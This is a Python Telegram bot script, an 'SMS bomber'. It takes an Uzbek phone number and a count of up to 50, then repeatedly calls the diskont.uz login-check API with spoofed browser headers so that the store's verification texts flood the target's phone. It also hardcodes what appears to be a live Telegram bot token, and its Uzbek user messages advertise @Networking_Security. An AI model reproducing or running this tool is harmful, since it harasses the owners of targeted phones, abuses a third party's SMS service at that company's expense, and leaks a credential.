import requests
import telebot
import time

token = "6903084803:AAH8zw2xo86SFoBRyrpdnFGAW7vMaSc8CZc"

def format_phone_number(phone_number):
    if len(phone_number) == 9 and phone_number.isdigit():
        return "998" + phone_number
    elif len(phone_number) == 12 and phone_number.startswith("998") and phone_number[3:].isdigit():
        return phone_number
    else:
        return None

def send_sms(phone_number, sms_count):

    data = {
        "phone_number": phone_number,
        "sms_count": sms_count
    }

    url = "https://api.diskont.uz/api/auth/check"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://diskont.uz",
        "Referer": "https://diskont.uz/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Te": "trailers",
        "Connection": "close"
    }

    response = requests.post(url, json=data, headers=headers)

    if response.ok:
        return True
    else:
        return False

bot = telebot.TeleBot(token)

stopped_users = {}

@bot.message_handler(commands=["start"])
def start_message(message):
    bot.send_message(message.chat.id, "👋🏻Assalomu alaykum! Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10 (SMS yuborishni toxtatish uchun /stop buyrug'ini bering) ㅤㅤㅤㅤㅤㅤㅤㅤ For @Networking_Security ☑️")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    data = message.text.split()
    if len(data) == 2 and data[0].isdigit() and len(data[0]) <= 9 and data[1].isdigit():
        phone_number = format_phone_number(data[0])
        sms_count = int(data[1])
        if phone_number and 1 <= sms_count <= 50:
            total_sent_sms = 0
            sms_status_message = bot.send_message(message.chat.id, f"✅Yuborilgan SMS soni: {total_sent_sms}")
            for _ in range(sms_count):
                if message.chat.id in stopped_users:
                    del stopped_users[message.chat.id]
                    break

                if send_sms(phone_number, 1):
                    total_sent_sms += 1
                    bot.edit_message_text(f"♻️SMS yuborilmoqda... {total_sent_sms}", chat_id=message.chat.id, message_id=sms_status_message.message_id)
                    time.sleep(1) 
                else:
                    bot.send_message(message.chat.id, "❌Xatolik: SMS yuborilmadi.")
            bot.send_message(message.chat.id, f"📄Yuborilgan SMSlar soni: {total_sent_sms} ta ☑️ ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ  ㅤㅤ @Networking_Security ☑️")
        else:
            bot.send_message(message.chat.id, "⚠️Noto'g'ri format. Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10")
    elif message.text == "/stop" and message.chat.id not in stopped_users:
        stopped_users[message.chat.id] = True
        bot.send_message(message.chat.id, "〽️SMS yuborish to'xtatildi.")
    else:
        bot.send_message(message.chat.id, "⚠️Noto'g'ri format. Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10")

bot.polling()
